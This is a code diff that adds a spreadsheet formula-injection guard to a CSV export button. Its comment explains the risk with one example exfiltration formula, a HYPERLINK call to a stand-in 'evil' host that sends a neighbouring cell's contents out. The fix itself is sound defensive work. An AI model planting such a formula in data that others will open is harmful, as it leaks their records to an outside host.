@@ -4,7 +4,35 @@ export function ExportButton({ rows, filename, columns }: { rows: any[]; filenam
   function exportCsv() {
     if (!rows?.length) { alert("No data to export yet."); return; }
     const cols = columns || Object.keys(rows[0]);
-    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
+    /*
+      TWO THINGS, NOT ONE. The quoting below is RFC-4180 and was already
+      right. What was missing is the formula guard.
+
+      A cell whose first character is = + - @ (or a tab/CR, which some
+      spreadsheets strip before parsing) is executed as a FORMULA by Excel,
+      LibreOffice and Google Sheets when the file is opened. The round trip is
+      real in this product and not hypothetical: lib/import-map.ts stores text
+      columns — party, customer_name, supplier, product, sku — as bare
+      String(v) from an uploaded CSV, a Google Sheets URL or /api/v1/ingest,
+      and those same tables are what this button exports. So a supplier can
+      choose the contents of a cell that later opens on the owner's machine,
+      and `=HYPERLINK("https://evil/?d="&A1,"Invoice")` exfiltrates the row
+      next to it on one click.
+
+      Prefixing a single quote is the conventional neutraliser: the character
+      is consumed by the spreadsheet as "treat the rest as text" and does not
+      appear in the cell. The value is unchanged for every cell that does not
+      start with one of these characters, including every number, because
+      negative numbers arrive here as "-123" — which is why the guard must
+      come after a numeric check, or it would quote-prefix real figures.
+    */
+    const RISKY = /^[=+\-@\t\r]/;
+    const esc = (v: any) => {
+      const s = String(v ?? "");
+      const isNumber = s !== "" && Number.isFinite(Number(s));
+      const safe = RISKY.test(s) && !isNumber ? `'${s}` : s;
+      return `"${safe.replace(/"/g, '""')}"`;
+    };
     const csv = [cols.join(","), ...rows.map((r) => cols.map((c) => esc(r[c])).join(","))].join("\n");
     const blob = new Blob([csv], { type: "text/csv" });
     const url = URL.createObjectURL(blob);
